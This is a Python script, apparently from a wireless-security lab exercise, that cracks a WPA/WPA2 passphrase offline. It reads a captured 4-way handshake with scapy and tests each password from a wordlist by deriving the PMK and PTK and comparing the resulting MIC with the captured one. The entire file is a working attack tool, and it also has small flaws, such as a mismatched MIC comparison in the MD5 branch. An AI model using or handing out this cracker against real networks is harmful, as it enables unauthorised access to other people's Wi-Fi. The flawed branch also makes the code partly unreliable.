#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
from numpy import right_shift
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap")

# Here we are taking each packet separetely, we needed the beacon fram in order to get the SSID
beaconFrame = wpa[0]

# The first handshake packet contains both MAC address and the AP nonce
handshake1 = wpa[5]

# The second handshake packet contains the client nonce
handshake2 = wpa[6]

# The last handshake packet contains the MIC encrypted with the KCK
handshake4 = wpa[8]

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = beaconFrame.info.decode()
APmac       = a2b_hex(handshake1.addr2.replace(":", ""))
Clientmac   = a2b_hex(handshake1.addr1.replace(":" , ""))

# Authenticator and Supplicant Nonces
nonceStartingOffset = 13
nonceEndOffset = 45
ANonce      = handshake1.load[nonceStartingOffset:nonceEndOffset]
SNonce      = handshake2.load[nonceStartingOffset:nonceEndOffset]

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
micStartingOffset = 77
micEndOffset = 93
mic_to_test = handshake4.load[micStartingOffset:micEndOffset]

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

# Here we are taking the data from the WIFI version, until the start of the MIC, and then we simply append a bunch of zero bytes at the end.
data        = bytes(handshake4['EAPOL'])[:micStartingOffset] + b'\x00' * 22

ssid = str.encode(ssid)
fileName = "wordlist.txt"
found = False

# Used to know wether it's HMAC-MD5 or HMAC-SHA1
keyDescriptorVersion = int.from_bytes(handshake1.load[0:1], byteorder='big')

with open(fileName) as wordlist:
    for passPhrase in wordlist:
        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        # We are getting rid of the '\n'
        passPhrase = str.encode(passPhrase[:-1])
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        if(keyDescriptorVersion == 2):
            mic = hmac.new(ptk[0:16],data,hashlib.sha1)
        else:
            mic = hmac.new(ptk[0:16],data,hashlib.md5)
        
        if mic.hexdigest()[:-8] == b2a_hex(mic_to_test).decode():
            print("[+] Found passphrase: " + passPhrase.decode())
            found = True
    
    if not found:
        print("[-] Passphrase not found !")